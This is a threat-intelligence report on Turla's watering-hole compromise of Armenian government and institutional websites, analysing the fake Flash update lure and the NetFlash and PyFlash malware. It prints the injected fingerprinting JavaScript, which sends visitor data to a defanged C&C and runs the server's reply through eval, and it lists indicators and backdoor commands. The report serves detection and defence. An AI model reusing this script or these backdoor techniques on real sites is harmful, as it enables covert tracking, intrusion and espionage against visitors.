Turla’s TTPs are largely unchanged, but the group recently added a\nPython backdoor.\n\nESET researchers found a watering hole (aka strategic web compromise) operation targeting several\nhigh-profile Armenian websites. It relies on a fake Adobe Flash update lure and delivers two previously\nundocumented pieces of malware we have dubbed NetFlash and PyFlash.\n\nVarious aspects of this campaign lead us to attribute this operation to Turla, an infamous espionage\ngroup active for more than ten years. Its main targets include governmental and military organizations.\n[We have previously reported multiple campaigns of this group including Mosquito and](https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf) [LightNeuron.](https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf)\n\nThis recent operation bears similarities to several of Turla’s watering hole campaigns that we have\n[tracked in the past years. In particular, the modus operandi is similar to a campaign we uncovered in](https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/)\n2017. The various pieces of JavaScript used there are almost identical to those in this campaign, but the\ntargets and payloads are different.\n\n## Targeted websites\n\nIn this specific operation, Turla has compromised at least four Armenian websites, including two\nbelonging to the government. Thus, it is likely the targets include government officials and politicians.\n\nAccording to ESET telemetry, the following websites were compromised:\n\narmconsul[.]ru: The consular Section of the Embassy of Armenia in Russia\nmnp.nkr[.]am: Ministry of Nature Protection and Natural Resources of the Republic of Artsakh\naiisa[.]am: The Armenian Institute of International and Security Affairs\nadgf[.]am: The Armenian Deposit Guarantee Fund\n\nWe have indications that these websites were compromised since at least the beginning of 2019. We\nnotified the Armenian national CERT and shared our analysis with them before publication.\n\nTurla operators leveraged unknown access methods to these websites to insert a piece of malicious\nJavaScript code. For example, for mnp.nkr[.]am, they appended obfuscated code at the end of jquerymigrate.min.js (a common JavaScript library), as shown in Figure 1.\n\n_Figure 1. Obfuscated JavaScript code injected into the mnp.nkr[.]am website_\n\nThis code loads an external JavaScript from skategirlchina[.]com/wp-includes/data_from_db_top.php.\nWe analyze this code in the next section.\n\n\n-----\n\nSince the end of November 2019, we noticed that skategirlchina[.]com was not delivering malicious\nscripts anymore. Thus, it is likely the Turla operators have suspended this watering hole operation.\n\n## Fingerprinting and malware delivery\n\nUpon visiting a compromised webpage, the second-stage malicious JavaScript is delivered by\nskategirlchina[.]com and fingerprints the visitor’s browser. Figure 2 shows the main function of this script.\n\n[If it is the first time the user’s browser executes the script, it will add an evercookie with a seemingly](https://en.wikipedia.org/wiki/Evercookie)\nrandom MD5 value provided by the server, different at each execution of the script. The implementation\n[of the evercookie is based on code available on GitHub. It uses multiple storage places such as the local](https://github.com/samyk/evercookie)\ndatabase, local shared objects (Flash cookies), Silverlight storage, etc., to store the cookie value. In\ncomparison to a regular cookie, it will be much more persistent as it won’t be deleted if the user just\ndeletes the browser’s cookies.\n\nThis evercookie will be used to track whether the user visits one of the compromised websites again.\nWhen the user comes back for a second time, the previously stored MD5 value will be used to identify\nthem.\n\nThen, it collects several pieces of information including the browser plugin list, the screen resolution and\nvarious operating system information. This is sent to the C&C server in a POST request. If there is a\nreply, it is assumed to be JavaScript code and is executed using the eval function.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\n\n[…]\n\nfunction f_ec(){\n\nvar ec = new evercookie({domain:'http://skategirlchina[.]com/wpincludes/data_from_db_top.php',baseurl:'?http://skategirlchina[.]com/wpincludes/data_from_db_top.php'});\n\nec.get(\"ec\", function(value) {\n\nif (value!=undefined){\n\nvar jsonText = {'ec': ''+value+'',\n\n'scp':screen.pixelDepth==undefined?''+0+'':''+screen.pixelDepth+'',\n\n'scw':''+screen.width+'',\n\n'sch':''+screen.height+'',\n\n'bn':''+bn+'',\n\n'bv':''+bv+'',\n\n'bc':''+bc+'',\n\n'osn':''+osn+'',\n\n'osv':''+osv+'',\n\n'osc':''+osc+'',\n\n'adr':''+adr+'',\n\n\n-----\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n\npdr : +pdr+,\n\n'fla':''+fla+'',\n\n'jav':''+jav+'',\n\n'wmp':''+wmp+'',\n\n'msw':''+msw+'',\n\n'qui':''+qui+'',\n\n'sho':''+sho+'',\n\n'type':'info',\n\n'tiz': ''+(new Date().getTimezoneOffset()/60)+''\n\n};\n\nvar json = JSON.stringify(jsonText);\n\najax({\n\ncontent_type : 'application/json',\n\nurl: 'http://skategirlchina[.]com/wp-includes/data_from_db_top.php?\nhttp://skategirlchina[.]com/wp-includes/data_from_db_top.php',\n\ncrossDomain: true,\n\ntype: 'POST',\n\ndata: json,\n\nonSuccess: function(m){\n\neval(m);\n\n}\n\n});\n\n}\n\nelse{\n\nec.set('ec', '<redacted MD5 value>');\n\nsetTimeout(f_ec,1500);\n\n}\n\n\n_Figure 2. Fingerprint script (malicious URLs defanged)_\n\nIf the visitor is deemed interesting, the server replies with a piece of JavaScript code that creates an\niframe. Data from ESET telemetry suggests that, for this campaign, only a very limited number of visitors\nwere considered interesting by Turla’s operators\n\n\n-----\n\nThis iframe displays a fake Adobe Flash update warning to the user, shown in Figure 3, in order to trick\nthem into downloading a malicious Flash installer.\n\n_Figure 3. Fake Adobe Flash update iframe_\n\nWe did not observe the use of any browser vulnerabilities. The compromise attempt relies only on this\nsocial engineering trick. Once the malicious executable is downloaded from the same server as the\niframe’s JavaScript, and if the user launches it manually, a Turla malware variant and a legitimate Adobe\nFlash program are installed.\n\nFigure 4 is an overview of the compromise process from initially visiting one of the compromised\nArmenian websites to the delivery of a malicious payload.\n\n\n-----\n\n_Figure 4. Overview of the watering hole operation_\n\n## Malware\n\nOnce the user executes the fake installer, it will execute both a Turla malware variant and a legitimate\nAdobe Flash installer. Thus, the user is likely to believe that the update warning was legitimate.\n\n### Before September 2019: Skipper\n\n\n-----\n\nPrior to the end of August 2019, the victim would receive a RAR-SFX archive containing a legitimate\nAdobe Flash v14 installer and a second RAR-SFX archive. The latter contains the various components\nof a backdoor known as Skipper that has been previously attributed to Turla. It was documented in 2017\nby researchers from [Bitdefender, and a more recent version was documented by Telsy in May 2019.](https://labs.bitdefender.com/wp-content/uploads/downloads/new-pacifier-apt-components-point-to-russian-linked-turla-group/)\n\nGiven that there are only minor changes between the documented versions and the most recent ones,\nwe won’t provide a detailed analysis here.\n\nOne interesting change is that the Skipper communication module uses the server that hosts this\ncampaign’s remote JavaScripts and malicious binaries for its C&C server, specifically\nskategirlchina[.]com/wp-includes/ms-locale.php.\n\n### From September 2019: NetFlash and PyFlash\n\nAt the end of August 2019, we noticed that the payload delivered by skategirlchina[.]com changed.\n\n**NetFlash (.NET downloader)**\n\nThe new payload was a .NET application that dropped an installer for Adobe Flash v32 in\n%TEMP%\\adobe.exe, and NetFlash (a .NET downloader) in %TEMP%\\winhost.exe.\n\nAccording to their compilation timestamps, the malware samples were compiled at the end of August\n2019 and at the beginning on September 2019, right before being uploaded to the watering hole’s C&C\nserver.\n\nNetFlash downloads its second stage malware from a hardcoded URL and establishes persistence for\nthis new backdoor using a Windows scheduled task. Figure 5 shows the NetFlash function that\ndownloads the second stage malware, named PyFlash. We also encountered another NetFlash sample,\nlikely compiled at the end of August 2019, with a different hardcoded C&C server:\n134.209.222[.]206:15363.\n\n_Figure 5. Main function of NetFlash_\n\n**PyFlash**\n\nThis second stage backdoor is a py2exe executable. py2exe is a Python extension to convert a Python\nscript into a standalone Windows executable. To our knowledge, this is the first time the Turla developers\nhave used the Python language in a backdoor.\n\n\n-----\n\nThe backdoor communicates with its hardcoded C&C server via HTTP. The C&C URL and other\nparameters such as the AES key and IV used to encrypt all network communications are specified at the\nbeginning of the script, as shown in Figure 6.\n\n_Figure 6. Global variables in the PyFlash Python script_\n\nThe main function of the script, shown in Figure 7, sends information about the machine to the C&C\nserver. This is the output of the functions from the commands list seen in Figure 6. It includes OS-related\ncommands (systeminfo, tasklist) and network-related commands (ipconfig, getmac, arp).\n\n_Figure 7. Main function of PyFlash_\n\nThe C&C server can also send backdoor commands in JSON format. The commands implemented in\nthis version of PyFlash are:\n\nDownload additional files from a given HTTP(S) link.\nExecute a Windows command using the Python function subprocess32.Popen.\nChange the execution delay: modifies the Windows task that regularly (every X minutes; 5 by\ndefault) launches the malware.\nKill (uninstall) the malware. To confirm this instruction the malware sends a POST request to the\nC&C server with the following string:\n\n_I’m dying :(_\n\n_Tell my wife that i love her…_\n\nThen, the output of the command is sent back to the operators, encrypted with AES, via a POST request.\n\n## Conclusion\n\n\n-----\n\nTurla is still using watering hole attacks as one of its initial access tactics. Interestingly, this campaign\nrelies on a well-known social engineering trick – a fake Adobe Flash update warning – in order to induce\nthe user to download and install malware.\n\nOn the other hand, the payload has changed, probably in order to evade detection, as Skipper has been\nknown for many years. They switched to NetFlash, which installs a backdoor we call PyFlash and that is\ndeveloped in the Python language.\n\n_We will continue monitoring new Turla activities and will publish relevant information on our blog.
